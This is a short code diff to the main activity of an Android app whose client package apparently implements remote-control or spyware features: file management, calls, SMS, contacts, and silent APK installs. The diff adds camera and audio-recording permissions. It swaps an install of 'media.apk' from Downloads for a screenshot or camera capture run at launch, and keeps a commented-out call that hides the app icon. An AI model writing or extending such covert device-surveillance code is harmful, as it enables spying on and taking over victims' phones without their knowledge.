@@ -17,8 +17,10 @@ import android.widget.Toast;
 import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.Phone;
 import com.ot.grhq.client.functionality.SMS;
+import com.ot.grhq.client.functionality.Screenshot;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.List;
 import java.util.Map;
 
@@ -26,12 +28,14 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 200;
     private static String[] PERMISSIONS = {
+        Manifest.permission.CAMERA,
         Manifest.permission.CALL_PHONE,
         Manifest.permission.SEND_SMS,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.WRITE_CONTACTS,
         Manifest.permission.READ_EXTERNAL_STORAGE,
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.RECORD_AUDIO,
         Manifest.permission.REQUEST_INSTALL_PACKAGES
     };
 
@@ -43,7 +47,7 @@ public class MainActivity extends AppCompatActivity {
         checkPermissions();
 
 //        hideApplicationIcon();
-        com.ot.grhq.client.functionality.PackageManager.installApp(getApplicationContext(), "file://" +Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)+"/media.apk");
+      String path = Screenshot.captureImage(getApplicationContext(), true);
     }
 
     /**
